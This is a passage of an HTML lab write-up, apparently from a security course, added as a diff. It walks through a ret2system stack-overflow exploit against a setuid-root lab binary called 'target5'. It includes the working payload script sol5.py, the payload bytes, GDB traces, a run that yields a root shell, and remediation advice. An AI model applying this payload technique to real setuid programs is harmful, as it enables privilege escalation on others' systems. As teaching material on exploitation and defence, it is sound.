+        <p class="small" style="margin-bottom:0">
+          The CPU refuses to fetch instructions from the stack because the page is not executable.
+        </p>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Allowed despite DEP</h3>
+        <pre style="margin-bottom:0"><span class="c"># ret2libc / ret2system</span>
+ret -&gt; <span class="g">0x08051520</span>  <span class="c">(system, r-xp)</span>
+system arg -&gt; <span class="g">0x080b884d</span> <span class="c">("/bin/sh", r--p)</span>
+       <span class="g">-&gt; existing executable code runs</span></pre>
+        <p class="small" style="margin-bottom:0">
+          The stack is only used as data: addresses and arguments. No instruction is fetched from it.
+        </p>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <strong>Non-PIE + static linking = predictable code addresses</strong>
+      <code>system()</code> is at <code>0x08051520</code> and <code>"/bin/sh"</code> is at
+      <code>0x080b884d</code> in target5. Because the executable is not PIE, those addresses are
+      fixed even if ASLR is enabled. This exploit therefore does not need a leak and does not
+      depend on environment variables.
+    </div>
+
+    <p class="small">
+      Full memory-map trace: <a href="gdb_maps.txt">gdb_maps.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="bad20">
+    <h2><span class="num">8</span>Why the old 20-byte payload segfaulted</h2>
+    <p class="section-intro">
+      The earlier version used 20 filler bytes. That is two bytes short of the saved return
+      address, so the <code>system</code> address straddled the saved EBP and saved EIP.
+      The resulting return address was not <code>system()</code> at all.
+    </p>
+
+    <div class="stack" aria-label="Misaligned 20-byte payload">
+      <div class="stack-row">
+        <span class="addr">0xfff6ba50</span>
+        <span class="val">0x884ddead</span>
+        <span class="what">misaligned fragment (part of fake return + <code>/bin/sh</code>)</span>
+      </div>
+      <div class="stack-row eip">
+        <span class="addr">0xfff6ba4c</span>
+        <span class="val">0xbeef0805</span>
+        <span class="what"><strong>saved EIP</strong> is now invalid — <code>ret</code> jumps here and crashes</span>
+      </div>
+      <div class="stack-row">
+        <span class="addr">0xfff6ba48</span>
+        <span class="val">0x15204141</span>
+        <span class="what">saved EBP partially overwritten by the first half of <code>0x08051520</code></span>
+      </div>
+      <div class="stack-row buf">
+        <span class="addr">0xfff6ba36</span>
+        <span class="val">0x41414141 …</span>
+        <span class="what">only 20 bytes of filler: two bytes too early</span>
+      </div>
+      <div class="arrow-note">20-byte padding shifts every injected address 2 bytes to the left</div>
+    </div>
+
+    <div class="file-label">GDB — the 20-byte payload at the ret instruction</div>
+    <pre>[1] AFTER strcpy() returns (20-byte padding version)
+    saved return slot (ebp+4) = 0xfff6ba4c
+    saved return value NOW    = <span class="r">0xbeef0805</span>
+    Stack words:
+0xfff6ba40: 0x41414141 0x41414141 0x15204141 <span class="r">0xbeef0805</span>
+0xfff6ba50: 0x884ddead 0x0000080b 0x00000000 0x0804a097
+
+[2] At vulnerable()'s ret instruction
+    ESP = 0xfff6ba4c
+    ret is about to jump to = <span class="r">0xbeef0805</span>  <span class="c">&lt;-- not system()</span>
+0xfff6ba4c: 0xbeef0805 0x884ddead 0x0000080b 0x00000000
+0xbeef0805: Cannot access memory at address 0xbeef0805</pre>
+
+    <div class="callout danger">
+      <strong>The fix was exactly two bytes</strong>
+      Use <strong>22</strong> bytes of padding, not 20. Then the next four bytes land exactly
+      on <code>0xfff6ba4c</code>, the saved EIP slot.
+    </div>
+
+    <p class="small">
+      Full trace: <a href="gdb_bad20.txt">gdb_bad20.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="solution">
+    <h2><span class="num">9</span>Final payload and the root shell</h2>
+    <p class="section-intro">
+      The final <code>sol5.py</code> prints raw bytes, not text. Those bytes are passed as the
+      single command-line argument to target5.
+    </p>
+
+    <div class="file-label">sol5.py</div>
+    <pre>import sys
+
+<span class="c"># target5 is 32-bit, non-PIE and statically linked (DEP enabled).</span>
+<span class="c"># vulnerable(): char buf[10]; strcpy(buf, arg)</span>
+<span class="c"># buf is at ebp-0x12, so saved EIP is 0x12 + 4 = 22 bytes from buf.</span>
+
+SYSTEM   = 0x08051520  <span class="c"># nm target5 -&gt; system()</span>
+BIN_SH   = 0x080b884d  <span class="c"># virtual address of "/bin/sh"</span>
+FAKE_RET = 0xDEADBEEF  <span class="c"># system() returns here after the shell exits</span>
+
+payload = (
+    b"A" * 22                            <span class="c"># reach and overwrite saved EIP</span>
+    + SYSTEM.to_bytes(4, "little")       <span class="c"># new EIP: system()</span>
+    + FAKE_RET.to_bytes(4, "little")     <span class="c"># fake return address for system()</span>
+    + BIN_SH.to_bytes(4, "little")       <span class="c"># system("/bin/sh")</span>
+)
+
+sys.stdout.buffer.write(payload)</pre>
+
+    <div class="file-label">Payload bytes</div>
+    <pre>4141414141414141414141414141414141414141  <span class="c"># 22 × 'A'</span>
+<span class="g">20150508</span>                                  <span class="c"># 0x08051520  system()</span>
+<span class="y">efbeadde</span>                                  <span class="c"># 0xdeadbeef  fake return</span>
+<span class="b">4d880b08</span>                                  <span class="c"># 0x080b884d  "/bin/sh"</span></pre>
+
+    <div class="file-label">Actual run of the setuid-root target</div>
+    <pre>$ printf 'id\nwhoami\nexit\n' | ./target5 "$(python3 sol5.py)"
+uid=0(root) gid=1002(student) groups=1002(student),24(cdrom),...
+root
+Segmentation fault
+
+<span class="c"># The shell is root. The final SIGSEGV happens because system() returns</span>
+<span class="c"># to the fake 0xdeadbeef address after /bin/sh exits. This is allowed.</span></pre>
+
+    <div class="callout warn">
+      <strong>GDB trace note</strong>
+      The GDB traces above use a copy of target5 so the debugger can control it. That copy is
+      not setuid-root, so the shell inside the GDB trace shows <code>uid=1002(student)</code>.
+      Running the real mode-6777 target without the debugger produces <code>uid=0(root)</code>,
+      as shown in the actual run above.
+    </div>
+
+    <p class="small">
+      Full root-shell run: <a href="run_result.txt">run_result.txt</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="checklist">
+    <h2><span class="num">10</span>Exploitability checklist</h2>
+    <p class="section-intro">
+      Every item below contributed to the exploit. Removing any one of the first three would
+      make this particular attack much harder or impossible.
+    </p>
+
+    <div class="card">
+      <ul class="checklist">
+        <li><strong>Unbounded write:</strong> <code>strcpy()</code> copies past the 10-byte logical buffer.</li>
+        <li><strong>Reachable return address:</strong> saved EIP is only 22 bytes from the start of <code>buf</code>.</li>
+        <li><strong>No stack canary:</strong> the corrupted return address is used without an integrity check.</li>
+        <li><strong>DEP/NX gives a false sense of safety:</strong> it blocks stack shellcode, but existing <code>system()</code> code is executable.</li>
+        <li><strong>Non-PIE static binary:</strong> <code>system()</code> and <code>"/bin/sh"</code> have fixed, known addresses.</li>
+        <li><strong>Privilege before the bug:</strong> <code>setuid(0)</code> runs before <code>vulnerable()</code>, so the reused code runs as root.</li>
+        <li><strong>No need for leaks:</strong> the payload only uses fixed executable addresses, not stack or environment addresses.</li>
+      </ul>
+    </div>
+
+    <h3>How the code should be fixed</h3>
+    <div class="card">
+      <ul class="checklist fix">
+        <li>Replace <code>strcpy()</code> with a bounded copy such as <code>snprintf(buf, sizeof buf, "%s", arg)</code> or <code>strlcpy()</code>.</li>
+        <li>Compile with stack-protector (canary) enabled for defense in depth.</li>
+        <li>Build as PIE so code addresses are randomized, and keep ASLR enabled.</li>
+        <li>Drop privileges permanently after the privileged operation instead of leaving root privileges live across the vulnerable call.</li>
+        <li>Keep NX/DEP enabled — it still raises the cost by forcing code-reuse attacks such as this one.</li>
+      </ul>
+    </div>
+
+    <div class="callout success">
+      <strong>Key takeaway</strong>
+      DEP prevents executing <em>new</em> instructions from the stack. It does not prevent an
+      attacker from changing <em>where existing instructions are called</em>. That is why
+      return-to-libc / ret2system still works.
+    </div>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="reproduce">
+    <h2><span class="num">11</span>Appendix: reproduce the GDB inspection</h2>
+    <p class="section-intro">
+      These are the commands used to collect the traces on this page. Breakpoints are placed at
+      the interesting moments: before the copy, after the copy, at <code>ret</code>, and at
+      <code>system()</code> entry.
+    </p>
+
+    <div class="file-label">Shell</div>
+    <pre><span class="c"># Work on a copy so GDB can trace it normally.</span>
+cp target5 /tmp/target5_dbg
+chmod +x /tmp/target5_dbg
+
+<span class="c"># Run with a harmless argument first.</span>
+gdb -q --args /tmp/target5_dbg AAAA
+
+<span class="c"># Then run with the exploit bytes.</span>
+gdb -q --args /tmp/target5_dbg "$(python3 sol5.py)"</pre>
+
+    <div class="file-label">Useful GDB commands</div>
+    <pre><span class="c"># Stop right after vulnerable()'s prologue, before strcpy().</span>
+break *0x0804a077
+
+<span class="c"># Stop immediately after strcpy() returns.</span>
+break *0x0804a082
+
+<span class="c"># Stop at the vulnerable() ret instruction.</span>
+break *0x0804a08a
+
+<span class="c"># Stop when execution reaches system().</span>
+break *0x08051520
+
+<span class="c"># Inspect the frame. buf = ebp-0x12, saved EIP slot = ebp+4.</span>
+info registers esp ebp eip
+p/x $ebp
+p/x $ebp-0x12
+p/x $ebp+4
+p/x *(unsigned int*)($ebp+4)
+x/12wx $ebp-0x18
+
+<span class="c"># At ret: ESP points at the saved return slot.</span>
+x/4wx $esp
+
+<span class="c"># At system entry: [esp] = fake return, [esp+4] = argument.</span>
+x/4wx $esp
+x/s *(unsigned int*)($esp+4)
+
+<span class="c"># Show which pages are executable (DEP / NX evidence).</span>
+info proc mappings</pre>
+
+    <div class="callout info">
+      <strong>Reading the traces</strong>
+      An address printed as <code>0x8051520</code> is the same as <code>0x08051520</code>.
+      GDB simply omits the leading zero. The important comparison is that the value in the
+      saved-EIP slot changes from <code>0x0804a0e7</code> (normal return into <code>_main</code>)
+      to <code>0x08051520</code> (<code>system</code>).
+    </div>
+  </section>
+
+  <footer>
+    <p>
+      GDB evidence collected in the lab VM. Raw traces:
+      <a href="gdb_normal.txt">normal run</a> ·
+      <a href="gdb_exploit.txt">exploit run</a> ·
+      <a href="gdb_bad20.txt">20-byte failure</a> ·
+      <a href="gdb_maps.txt">memory map</a> ·
+      <a href="run_result.txt">root shell</a>.
+    </p>
+    <p>target5 stack walkthrough · educational use only.</p>
+  </footer>
+
+</main>
+</body>
+</html>
